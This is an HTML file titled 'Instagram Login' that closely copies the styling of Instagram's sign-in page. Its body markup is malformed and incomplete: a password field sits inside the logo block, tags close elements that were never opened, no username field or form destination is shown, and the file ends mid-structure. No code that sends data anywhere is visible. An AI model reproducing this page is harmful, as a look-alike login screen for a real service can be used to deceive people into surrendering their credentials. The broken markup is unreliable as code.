
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            width: 90%; /* Adjust width for mobile */
            max-width: 350px; /* Limit maximum width */
        }

        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            margin-bottom: 10px;
            padding: 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }

        .language-select {
            border: none;
            padding: 8px;
            font-size: 12px;
            color: #8e8e8e;
            align-self: flex-end;
            margin-bottom: 10px;
        }

        .logo {
            margin-bottom: 30px;
        }

        .logo img {
            height: 51px;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            width: 100%;
        }

        .input-group {
            margin-bottom: 10px;
            position: relative; /* For placeholder animation */
        }

        .input-group input {
            width: calc(100% - 20px);
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            box-sizing: border-box;
            -webkit-appearance: none; /* Remove default input styling */
            appearance: none;
        }

        .input-group label {
            position: absolute;
            left: 10px;
            top: 10px;
            font-size: 14px;
            color: #8e8e8e;
            pointer-events: none;
            transition: all 0.2s ease-in-out;
        }

        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: 2px;
            font-size: 10px;
        }

        .login-button {
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px; /* More standard button radius */
            padding: 8px; /* Adjust padding */
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 20px;
            width: 100%; /* Full width button */
        }

        .login-button:hover {
            opacity: 0.8;
        }

        .separator {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            margin-bottom: 20px;
            width: 100%;
        }

        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or {
            margin: 0 10px;
            font-size: 13px;
            font-weight: bold;
        }

        .facebook-login {
            margin-bottom: 20px;
        }

        .facebook-button {
            background-color: #fff; /* Facebook blue with white text is more common */
            color: #385185;
            border: none;
            border-radius: 4px;
            padding: 8px 20px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
        }

        .facebook-button img {
            height: 20px;
            margin-right: 8px; /* Adjust spacing */
        }

        .facebook-button:hover {
            opacity: 0.8;
        }

        .forgot-password {
            margin-bottom: 20px;
        }

        .forgot-password a {
            color: #00376b;
            font-size: 12px; /* Adjust font size */
            text-decoration: none;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            width: 100%;
            text-align: center;
            margin-bottom: 10px;
            font-size: 14px; /* Adjust font size */
        }

        .signup-box a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }

        .signup-box a:hover {
            text-decoration: underline;
        }

        .app-badges {
            text-align: center;
            margin-bottom: 20px;
            font-size: 14px; /* Adjust font size */
        }

        .app-badges p {
            margin-bottom: 10px;
        }

        .badges a {
            margin: 0 5px;
        }

        .badges img {
            height: 40px;
        }

        .footer {
            text-align: center;
            padding: 20px 0; /* Add padding to the footer */
        }

        .footer-links {
            list-style: none;
            padding: 0;
            margin: 0 0 10px 0;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
        }

        .footer-links li {
            margin: 0 10px;
        }

        .footer-links a {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .copyright {
            color: #8e8e8e;
            font-size: 12px;
        }

        /* Media query for smaller screens (more aggressive adjustments) */
        @media (max-width: 600px) {
            .container {
                width: 100%;
                max-width: none;
                padding: 30px; /* Increase padding on smaller screens */
            }

            .login-box, .signup-box {
                border: none;
                background-color: transparent;
                padding: 20px 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
           
            <div class="logo">

                    <input type="password" id="password" name="password" placeholder="" required>
                    <label for="password">Password</label>
                </div>
                <button type="submit" class="login-button">Log in</button>
            </form>
            <div class="separator">
                <div class="line"></div>
